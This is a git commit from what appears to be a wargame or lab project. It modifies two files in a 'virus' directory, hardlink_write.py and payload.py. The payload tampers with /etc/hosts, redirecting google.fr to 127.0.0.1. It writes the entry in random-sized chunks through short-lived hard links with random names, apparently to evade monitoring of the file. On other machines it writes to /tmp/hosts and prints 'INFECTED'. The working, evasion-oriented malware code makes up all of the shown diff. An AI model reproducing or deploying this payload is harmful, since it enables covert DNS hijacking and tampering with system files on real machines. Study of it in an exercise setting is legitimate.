fff73337f97f89a9d6da59e81380f6cbb7ab6961
ClementNotin <clement@notin.org>
2013-03-05 11:44:37 +0100

    [Virus] Création et suppression d'un hardlink random vers /etc/hosts pour chaque écriture de chunk

--- virus/hardlink_write.py
+++ virus/hardlink_write.py
@@ -3,6 +3,7 @@
 
 import os
 from random import randint
+from uuid import uuid4 as uuid
 
 DATA = "START ABC OWNED XYZ END"
 size = len(DATA)
@@ -10,16 +11,19 @@ offset = 0
 
 #print "size=%d" % (size,)
 
-os.link("/tmp/hosts", "/tmp/hardlink")
-f = open("/tmp/hardlink","a")
 while(offset < size):
+    hardlink = "/tmp/%s" % uuid()
+    os.link("/tmp/hosts", hardlink)
+    f = open(hardlink,"a")
     size_chunk = randint(1, 1+(size-offset)/2)
     #print "taille %d"%size_chunk
     #print "size_chunk=%d, [%d:%d]"%(size_chunk, offset, offset+size_chunk)
     f.write(DATA[offset:offset+size_chunk])
     f.flush()
     offset+=size_chunk
+    f.close()
+    os.unlink(hardlink)
     #break
     
 
-f.close()
+
--- virus/payload.py
+++ virus/payload.py
@@ -1,25 +1,35 @@
 import socket
 import os
 from random import randint
+from uuid import uuid4 as uuid
+
 
 if __file__ != "lolita.final.pyc":
     if socket.gethostname() == "OT-Wargame":
-        new_host = "127.0.0.1\tgoogle.fr"
-
-        os.link("/tmp/hosts", "/tmp/syslog")
-        f = open("/tmp/syslog", "a+")
-
-        if f.read().find(new_host) == -1:
-            size = len(new_host)
-            offset = 0
-            while(offset < size):
-                size_chunk = randint(1, 1+(size-offset)/2)
-                f.write(new_host[offset:offset+size_chunk])
-                f.flush()
-                offset+=size_chunk
-            f.write("\n")
-
-        f.close()
-        os.unlink("/tmp/syslog")
+        hosts_path = "/etc/hosts"
     else:
+        hosts_path = "/tmp/hosts"    
         print " ###########  /!\ INFECTED /!\ ############### "
+    
+    new_host = "127.0.0.1\tgoogle.fr\n"
+    
+    hardlink = "/tmp/%s" % uuid()
+    os.link(hosts_path, hardlink)
+    f = open(hardlink, "r")
+    content=f.read()
+    f.close()
+    os.unlink(hardlink)
+    
+    if content.find(new_host) == -1:
+        size = len(new_host)
+        offset = 0
+        while(offset < size):
+            hardlink = "/tmp/%s" % uuid()
+            os.link(hosts_path, hardlink)
+            f = open(hardlink, "a")
+            size_chunk = randint(1, 1+(size-offset)/2)
+            f.write(new_host[offset:offset+size_chunk])
+            f.flush()
+            offset += size_chunk
+            f.close()
+            os.unlink(hardlink)
